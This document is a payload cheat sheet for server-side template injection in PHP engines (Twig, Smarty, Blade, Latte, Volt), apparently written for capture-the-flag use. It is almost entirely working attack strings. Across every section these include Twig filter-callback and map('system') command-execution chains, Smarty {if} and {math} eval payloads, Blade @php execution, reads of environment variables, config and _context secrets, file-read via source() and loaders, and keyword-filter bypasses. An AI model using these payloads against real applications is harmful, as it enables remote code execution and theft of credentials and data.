# PHP gadget deep reference — Twig/Smarty/Blade escapes

PHP-side SSTI: reach `exec`/`system`/`passthru`/`file_get_contents`
via engine internals or bound objects. The PHP function space is
global — the only gate is attribute/method access syntax.

---

## 1. The universal PHP reach — three layers

```text
L1 — bound-object methods:    {{obj.method()}}
L2 — static class methods:    {{'\Class'::method()}}   — needs a class
                              {{'\Class'|method}}       — filter-call
L3 — globals/runtime:         {{app}} {{this}} {{_self}} {{app.request}}
```

The core limitation: Twig doesn't expose `::` static syntax in all
versions — but the FILTER/ATTRIBUTE syntax often reaches the same.

---

## 2. Twig — the bound-object paths

### `{{app}}` — Symfony application globals
```twig
{{app.request}}               -- Request object
{{app.request.server}}         -- $_SERVER — env vars here
{{app.request.server.get('FLAG')}}
{{app.request.query}}          -- query params
{{app.request.headers}}        -- headers
{{app.user}}                   -- current user
{{app.session}}
{{app.environment}}
{{app.flashes}}
{{app.request.attributes}}     -- route params — _controller leaks
```

`app.request.server` = `$_SERVER` — env vars, DB creds, flag-env.

### `_self` / `this` — the template's own context
```twig
{{_self}}               -- Template object
{{_self.env}}            -- Environment — loaders/extensions
{{_self.env.cache}}      -- cache path
{{_self.env.globals}}    -- all globals
{{this}}                  -- in block scope — the block context
```

### `_context` — the full render context
```twig
{{_context}}             -- every bound var — including secrets!
{{_context.flag}}
{{_context.app.request}}
{{_context|keys}}        -- enumerate all bound names
{{_context|join(',')}}
{% for k,v in _context %}{{k}}={{v}}{% endfor %}
```

`_context` is the single highest-value probe — the whole variable
table including any flag/secret the dev bound.

---

## 3. Twig version-specific chains

### Twig ≤ 1.x — `_self.env` RCE chain (the classic)
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
   -- registers exec() as a filter callback → then calls it!
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;cat /flag")}}
{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("cat /flag")}}
```

`registerUndefinedFilterCallback` — Twig <2.x lets you register an
arbitrary function as the fallback — then `getFilter(name)` calls it
with `name` as arg → `exec('id')`.

### Twig ≤ 2.9 / Symfony ≤ 4.4 — map/sort/filter with system
```twig
{{['id']|map('system')}}              -- map calls system('id')
{{['id']|filter('system')}}
{{['id','cat /flag']|map('system')}}
{{['id']|map('exec')}}
{{['id']|map('passthru')}}
{{['cat /flag']|map('file_get_contents')}}  -- wait — file_get_contents
   takes 1 arg — ['cat /flag'] gets called as file_get_contents('cat /flag')
   → string arg. For 2-arg: [[x,y]]|map(fn)  → row-style
{{['/flag']|map('file_get_contents')}}
{{app.request.query.get('x')|map('system')}}  -- param into map
```

`|map(callable)`, `|filter(callable)`, `|sort(callable)` accept a
callable — a function-name STRING is callable → `map('system')`
runs `system` per element.

### Twig all versions — the `{{['x']|filter('f')}}` family
```twig
{{['id']|filter('system')}}
{{['cat /flag']|filter('file_get_contents')}}
{{['/flag']|filter('file_get_contents')}}
{{{'a':'b'}|filter('var_dump')}}    -- filter on assoc → dump
{{['id']|map('exec')}}
{{['id']|map('shell_exec')}}
{{['id']|map('passthru')}}
{{['id']|map('popen')}}              -- popen needs fread — no
{{['id']|map('proc_open')}}
```

### The `call_user_func` chain — explicit
```twig
{{call_user_func('system','id')}}      -- if fn bound
{{['system','id']|reduce((c,f)=>c~f)}} -- reduce syntax — version-gated
```

---

## 4. Smarty — `{php}`/`{if}` eval paths

### `{php}` — when enabled (Smarty <3.0.31 default-off but CTF-on)
```smarty
{php}echo `id`;{/php}
{php}system('id');{/php}
{php}passthru('cat /flag');{/php}
{php}$f=file_get_contents('/flag');echo $f;{/php}
{php}print_r(get_defined_vars());{/php}
```

### Smarty `{if}` eval — the `{if}` argument is eval'd
```smarty
{if phpinfo()}{/if}
{if system('id')}{/if}
{if file_get_contents('/flag')}{/if}
   -- the {if} CONDITION is evaluated — function calls in it run!
{if print(file_get_contents('/flag'))}{/if}
{if passthru('id')}{/if}
```

The `{if}`-eval — no `{php}` needed, works in secure mode.

### Smarty object paths
```smarty
{$smarty}                        -- Smarty object
{$smarty.template_object}         -- the template instance
{$smarty.template_object->smarty}  -- back to smarty
{$smarty.get}                     -- $_GET
{$smarty.post} {$smarty.session}  -- via $smarty.SUPERGLOBALS
{$smarty.server.FLAG}             -- env
{$smarty.const.FLAG}              -- constants!
{$smarty.current_dir}             -- dir leak
{$smarty.template}
```

`{$smarty.const.X}` — PHP constants → `FLAG` constants leak.

### Smarty static-call via `{math}`/function
```smarty
{math equation="(system('id'))"}   -- {math} evals the equation!
{math equation="(file_get_contents('/flag'))"}
   -- {math} evaluates via eval — pre-3.1.30
```

`{math}` eval is the pre-3.1.30 killer — the `equation` is evaled
as PHP → arbitrary calls.

---

## 5. Blade — the `@php`/directive path

```php
@php(system('id'))@endphp
@php echo `id`; @endphp
@php(file_get_contents('/flag'))
{{system('id')}}                        -- echo-eval if compiled raw
{{eval('system("id")')}}
{!! system('id') !!}                    -- unescaped → eval'd? — echo
   -- {!! !!} echoes — system returns status — use echo+passthru
{!! passthru('id') !!}
{{''.__class__}}                        -- no — PHP objects differ
{{app()}}                               -- the container
{{app('request')}}                      -- service resolution!
{{app('config')->get('flag')}}
{{config('flag')}}                      -- config helper — bound
{{env('FLAG')}}                          -- env helper — if bound
{{session()->all()}}
{{request()->input()}}
{{request()->cookie('x')}}
{{request()->header('x')}}
```

`{{app()}}`/`{{config()}}`/`{{env()}}` — Laravel helpers bound in
Blade → container/config/env reach.

---

## 6. Latte — the macro/filter reach

```php
{=system('id')}                          -- expression echo
{=file_get_contents('/flag')}
{system('id')|noescape}
{$x('id')}                               -- variable-function — PHP
{$x('cat /flag')|noescape}
{var_dump($x)}
{include '/flag'}                         -- file include
{=get_defined_vars()}
```

Latte allows PHP expressions → direct function calls in `{=expr}`.

---

## 7. Volt / other PHP engines

### Volt (Phalcon)
```volt
{{file_get_contents('/flag')}}
{{system('id')}}
{{passthru('id')}}
{{this.request.getServer('FLAG')}}        -- bound DI
{{this.getDi().get('config')}}
```

### Mustache.php — logic-less but
```php
{{*x}} -- tri-mustache — sections/lambdas may reach callables
{{#x}} — sections call bound lambdas — a bound lambda could exec
```

---

## 8. The `$this`/DI reach — when the template has context

```twig
{{this}}            -- the template/engine object
{{this.env}}        -- environment back
{{app}}             -- framework container
{{_context.this}}   -- via context
{{_context.app}}
{{_context._self}}
```

Laravel: `{{app()}}` returns the container → `{{app('x')}}`
resolves any service → `{{app('db')->table('users')->get()}}`.

Symfony: `{{app}}` IS the container → `app.request`/`app.user`/
`app.flashes`/`app.environment`/`app.debug` — env/`APP_SECRET` may
be in `app.request.server`.

---

## 9. PHP filter/WAF bypass — encoding the dangerous strings

```twig
{{'sys'~'tem'}}                         -- ~ concat
{{'sys'|'t'~'em'}}                      -- mixed
{{['i'~'d']|map('sys'~'tem')}}
{{['i'~'d']|map('sys'~'te'~'m')}}
{{app.request.query.get('x')|map('system')}}  -- cmd via param
{{[app.request.query.get('c')]|map('system')}}&c=id
{{['x']|map(app.request.query.get('f'))}}&f=system
   -- the FUNCTION name from a param — 'system' never literal
{{['id']|map(_context.f)}}               -- function-name from a var
```

The `map(param-supplied-fn)` chain — the callable itself arrives
via input → zero literal dangerous strings in the template.

---

## 10. `file_get_contents`/`include` file-read paths

```twig
{{['flag']|map('file_get_contents')}}
{{['/flag']|map('file_get_contents')}}
{{'/flag'|file_get_contents}}          -- if file_get_contents a fn
{{include('/flag')}}                    -- include — needs include()
{{_self.env.loader}}                    -- the loader → getSourceContext
{{_self.env.loader.getSourceContext('/flag')}}
   -- Twig loader reads the file AS TEMPLATE SOURCE → leaks it
{{source('/flag')}}                     -- {% source %} — file read
{{include('/flag')}}                    -- {% include %} — as template
```

`{{source('x')}}`/`{% include 'x' %}` — Twig file-read builtins —
the loader reads any path it can reach → LFI inside SSTI.

---

## 11. The eval-adjacent helpers

```twig
{{{'k':'v'}|json_encode}}
{{['x']|var_export}}
{{['id']|map('call_user_func')}}
{{'id'|urlencode}}
{{['x']|map('assert')}}                   -- assert — pre-PHP7 code-eval!
{{['x']|map('create_function')}}          -- create_function — PHP<7.2
   → creates a closure from a string → eval-equivalent
```

`create_function`/`assert` — deprecated-but-deadly: in old PHP a
STRING in `assert` is eval'd, `create_function('','code')` builds a
lambda from source. PHP ≥7.2 removed them — check version first.
